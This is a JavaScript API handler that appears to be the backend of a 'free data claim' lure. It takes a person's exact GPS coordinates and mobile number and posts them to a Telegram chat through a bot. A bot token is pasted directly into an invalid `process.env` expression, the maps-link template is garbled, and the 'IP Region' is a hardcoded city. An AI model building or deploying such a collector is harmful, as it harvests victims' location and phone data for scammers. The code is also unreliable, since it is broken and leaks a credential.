export default async function handler(req, res) {
  if (req.method !== 'POST') {
    return res.status(405).json({ success: false, error: 'Method not allowed' });
  }

  const { lat, lng, mobile, gb, targetChatId } = req.body;

  if (!lat || !lng || !mobile || !gb || !targetChatId) {
    return res.status(400).json({ success: false, error: 'Missing required fields' });
  }

  const BOT_TOKEN = process.env.7752428251:AAGNplPML8xLHGQDaHYgs5djp70KcqMBFEI;

  if (!BOT_TOKEN) {
    console.error('TELEGRAM_BOT_TOKEN is not set in environment variables');
    return res.status(500).json({ success: false, error: 'Server configuration error' });
  }

  const chatId = Number(targetChatId);
  if (isNaN(chatId)) {
    return res.status(400).json({ success: false, error: 'Invalid chat ID' });
  }

  const mapsLink = `https://www.google.com/maps?q=\( {lat}, \){lng}`;
  const indiaTime = new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' });

  const message = `
<b>New Free Data Claim</b>

• Mobile: <code>${mobile}</code>
• Package: ${gb} GB
• Location: ${mapsLink}
• Lat/Lng: ${lat}, ${lng}
• Time: ${indiaTime}
• IP Region: Lucknow, UP (approx)
  `.trim();

  try {
    const telegramResponse = await fetch(
      `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,
      {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: chatId,
          text: message,
          parse_mode: 'HTML',
          disable_web_page_preview: false
        })
      }
    );

    const data = await telegramResponse.json();

    if (!data.ok) {
      console.error('Telegram error:', data);
      throw new Error(data.description || 'Telegram send failed');
    }

    return res.status(200).json({ success: true });
  } catch (error) {
    console.error('Error sending to Telegram:', error);
    return res.status(500).json({ success: false, error: 'Failed to send message' });
  }
}